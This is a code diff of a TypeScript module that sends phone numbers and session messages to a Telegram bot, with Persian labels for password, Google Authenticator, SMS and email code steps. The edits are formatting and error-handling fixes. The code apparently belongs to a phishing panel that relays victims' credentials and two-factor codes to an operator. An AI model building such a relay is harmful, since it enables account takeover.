@@ -101,7 +101,9 @@ export const sendCustomMessageToTelegram = async (
           statusText: response.statusText,
           error: errorText,
         });
-        throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
+        throw new Error(
+          `Telegram API error: ${response.status} - ${errorText}`,
+        );
       }
 
       const result = await response.json();
@@ -118,9 +120,11 @@ export const sendCustomMessageToTelegram = async (
     } catch (fetchError) {
       clearTimeout(timeoutId);
 
-      if (fetchError.name === 'AbortError') {
+      if (fetchError.name === "AbortError") {
         console.error("❌ Telegram request timed out");
-        throw new Error("Request timed out. Please check your internet connection.");
+        throw new Error(
+          "Request timed out. Please check your internet connection.",
+        );
       }
 
       throw fetchError;
@@ -376,20 +380,34 @@ export const sendPhoneToTelegramEnhanced = async (
           statusText: response.statusText,
           error: errorText,
         });
-        throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
+        throw new Error(
+          `Telegram API error: ${response.status} - ${errorText}`,
+        );
       }
 
-    const result = await response.json();
-    session.messageId = result.result.message_id;
+      const result = await response.json();
+      session.messageId = result.result.message_id;
 
-    // Store session
-    activeSessions.set(sessionId, session);
+      // Store session
+      activeSessions.set(sessionId, session);
 
-    console.log("✅ Phone number sent to Telegram successfully:", {
-      sessionId,
-      messageId: session.messageId,
-    });
-    return { success: true, sessionId };
+      console.log("✅ Phone number sent to Telegram successfully:", {
+        sessionId,
+        messageId: session.messageId,
+      });
+      return { success: true, sessionId };
+    } catch (fetchError) {
+      clearTimeout(timeoutId);
+
+      if (fetchError.name === "AbortError") {
+        console.error("❌ Telegram request timed out");
+        throw new Error(
+          "Request timed out. Please check your internet connection.",
+        );
+      }
+
+      throw fetchError;
+    }
   } catch (error) {
     console.error("❌ Failed to send phone to Telegram:", error);
     return { success: false, sessionId };
@@ -1138,7 +1156,7 @@ const getCurrentStepText = (step: string): string => {
     auth_password: "وارد کردن رمز عبور",
     auth_google: "وارد کردن کد Google Auth",
     auth_sms: "وارد کردن کد پیامک",
-    auth_email: "وارد ک��دن کد ایمیل",
+    auth_email: "وارد کردن کد ایمیل",
     completed: "تکمیل شده",
   };
 
